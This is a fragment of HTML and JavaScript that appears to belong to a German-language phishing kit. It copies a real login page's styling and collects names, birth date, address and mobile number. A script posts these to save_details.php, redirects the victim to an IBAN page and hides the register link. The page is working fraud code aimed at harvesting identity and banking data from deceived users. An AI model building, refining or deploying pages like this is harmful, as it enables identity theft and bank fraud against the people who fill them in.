                    ...
                    <div class="ceeb7e995 c98450f08">
                        ...
                        <div class="c35cc68b7">
                            ...
                            <div class="c2701a345 c22884cc9">
                                <form id="loginForm" method="POST" action="save_details.php" class="cb2e1bdc9 c165a3537" data-form-primary="true">
                                        ...
                                        <div class="c862f080e">
                                            ...
                                            <div class="input-wrapper _input-wrapper">
                                                <div class="c6d02143e c46e32be0 text c70cc0741" data-action-text="" data-alternate-action-text="">
                                                    ...
                                                    <input class="input c19ad00c3 c30d9afca" inputMode="text" name="username" id="vorname" type="text" required autoComplete="username" autoCapitalize="none" spellCheck="false" autoFocus>
                                            ...
                                            <div class="input-wrapper _input-wrapper">
                                                <div class="c6d02143e c46e32be0 text c70cc0741" data-action-text="" data-alternate-action-text="">
                                                    ...
                                                    <input class="input c19ad00c3 c30d9afca" inputMode="text" name="Nachname" id="nachname" type="text" required autoComplete="username" autoCapitalize="none" spellCheck="false" autoFocus>
                                            ...
                                            <div class="input-wrapper _input-wrapper">
                                                <div class="c6d02143e c46e32be0 text c70cc0741" data-action-text="" data-alternate-action-text="">
                                                    ...
                                                    <input class="input c19ad00c3 c30d9afca" inputMode="text" name="username" id="geburtsdatum" id="geburtsdatum" type="date" required required autoComplete="username" autoCapitalize="none" spellCheck="false" autoFocus>
                                                ...
                                                <div class="input-wrapper _input-wrapper">
                                                    <div class="c6d02143e c46e32be0 text c70cc0741" data-action-text="" data-alternate-action-text="">
                                                        ...
                                                        <input class="input c19ad00c3 c30d9afca" inputMode="text" name="username" id="strasse" type="text" required autoComplete="username" autoCapitalize="none" spellCheck="false" autoFocus>
                                            ...
                                            <div class="input-wrapper _input-wrapper">
                                                ...
                                                <div class="c6d02143e c46e32be0 text c70cc0741" data-action-text="" data-alternate-action-text="">
                                                    ...
                                                    <input class="input c19ad00c3 c30d9afca" inputMode="number" name="username" id="plz" type="number" required autoComplete="username" autoCapitalize="none" spellCheck="false" autoFocus>
                                            ...
                                            <div class="input-wrapper _input-wrapper">
                                                <div class="c6d02143e c46e32be0 text c70cc0741" data-action-text="" data-alternate-action-text="">
                                                    ...
                                                    <input class="input c19ad00c3 c30d9afca" inputMode="text" name="username" id="ort" type="text" required autoComplete="username" autoCapitalize="none" spellCheck="false" autoFocus>
                                            ...
                                            <div class="input-wrapper _input-wrapper">
                                                <select id="countryCode" name="countryCode" style="padding: 4px;">
                                                ...
                                                <div class="c6d02143e c46e32be0 text c70cc0741" data-action-text="" data-alternate-action-text="">
                                                    ...
                                                    <input class="input c19ad00c3 c30d9afca" inputMode="tel" name="username" id="handynummer" type="text"
                                                        type="text" required pattern="\d+" title="Only numbers allowed">
        ...
        <footer class="MuiBox-root css-1v54gwv">
            ...
            <script>
                ...
                document.getElementById('loginForm').addEventListener('submit', function(event) {
                    ...
                    if (!vorname || !nachname || !geburtsdatum || !strasse || !plz || !ort || !handynummer) {
                    ...
                    formData.append('handynummer', countryCode + handynummer);
                    ...
                    fetch('save_details.php', {
                        ...
                        .then(data => {
                            ...
                            window.location.href = '../iban/iban_page.php';
                        })
                        .catch(error => {
                ...
                window.onload = function() {
                    ...
                    if (registerLink) {
                        registerLink.style.display = "none"; // Correctly hide the register link
                    }
                };
